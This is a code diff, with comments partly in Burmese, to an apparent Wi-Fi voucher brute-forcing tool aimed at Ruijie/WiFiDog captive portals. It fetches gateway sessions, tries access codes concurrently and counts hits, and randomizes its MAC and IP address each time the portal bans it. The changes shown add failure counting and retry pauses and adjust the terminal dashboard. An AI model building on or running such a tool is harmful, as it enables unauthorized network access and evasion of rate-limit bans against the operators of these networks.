@@ -157,7 +157,7 @@ def build_gw_params(portal_url):
         
     console.print(f"[cyan][+] Params: gw_id={p['gw_id']} nasip={p['nasip']} ssid={p['ssid']}[/cyan]")
     return p
-  # ---------- real session ----------
+# ---------- real session ----------
 async def fetch_real_session(session, gw_params, mac, ip):
     base = gw_params.get("url", RUIJIE_BASE) + RUIJIE_WIFIDOG
     p = dict(gw_params); p["mac"] = mac; p["ip"] = ip
@@ -269,7 +269,7 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
     progress = min(100.0, (tested/total)*100) if total else 0.0
     header = Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan", justify="center")
 
-    stat_style = "bold red" if any(x in status.upper() for x in ("ERR","TIMEOUT","BAN","EXHAUST")) else "bold green"
+    stat_style = "bold red" if any(x in status.upper() for x in ("ERR","TIMEOUT","BAN","EXHAUST", "FAIL")) else "bold green"
     sess_style = {"REAL":"bold green","EXPIRED":"bold red","BANNED":"bold red","HIT":"bold bright_green"}.get(sess_stat,"bold cyan")
     sess_txt = f"{sess_stat} ({(sess_id or '')[:8]})" if sess_id and sess_id != "--------" else sess_stat
 
@@ -282,7 +282,8 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
     tbl.add_row("  🖥 MAC",      f": ...{mac[-8:]}",            "  🌐 IP",       f": ...{ip[-3:]}")
     tbl.add_row("  🔐 Session", f": {sess_txt}",               "  📈 Progress", f": {progress:.2f}%", style=sess_style)
 
-    tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=9)
+    # Screen နဲ့ ကိုက်ညီအောင် height ကို နည်းနည်းချထားတယ်
+    tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=8)
     code_panel = Panel(Align.center(Text(f"Check Code : {cur_code or '------'}", style="bold yellow")),
                        border_style="yellow", box=ROUNDED, height=3)
 
@@ -300,7 +301,7 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
 
     body = Layout()
     body.split_column(
-        Layout(tbl_panel, size=9),
+        Layout(tbl_panel, size=8),
         Layout(code_panel, size=3),
         Layout(vt, ratio=1),
         Layout(footer, size=3),
@@ -333,6 +334,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     ip  = generate_random_ip()
     sess = None
     sess_time = 0.0
+    fail_count = 0
 
     sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
     conn = aiohttp.TCPConnector(limit=50, ssl=False, force_close=False)
@@ -354,6 +356,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         (tested/max(1,time.time()-start))*60, mac, ip, "GET…", "--------", total_target))
 
                     tag, payload = await fetch_real_session(session, gw_params, mac, ip)
+                    
                     if tag == "REAL":
                         sess = payload
                         sess["url_base"] = gw_params.get("url", RUIJIE_BASE)
@@ -361,6 +364,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         sess_id = sess["sessionId"]
                         sess_time = time.time()
                         status = "Active"
+                        fail_count = 0
                     elif tag == "BAN":
                         mac = generate_random_mac(); ip = generate_random_ip()
                         sess_stat = "BANNED"; sess = None
@@ -369,8 +373,14 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         continue
                     else:
                         sess_stat = "FAIL"; sess = None
-                        status = f"Session fail: {payload}"
-                        await asyncio.sleep(2)
+                        status = f"Fail: {payload}" # Error ကို ဒီမှာ ပြမယ်
+                        fail_count += 1
+                        if fail_count >= 5:
+                            status = "Check Wi-Fi! Not Connected."
+                            await asyncio.sleep(10)
+                            fail_count = 0
+                        else:
+                            await asyncio.sleep(2)
                         continue
 
                 batch = []
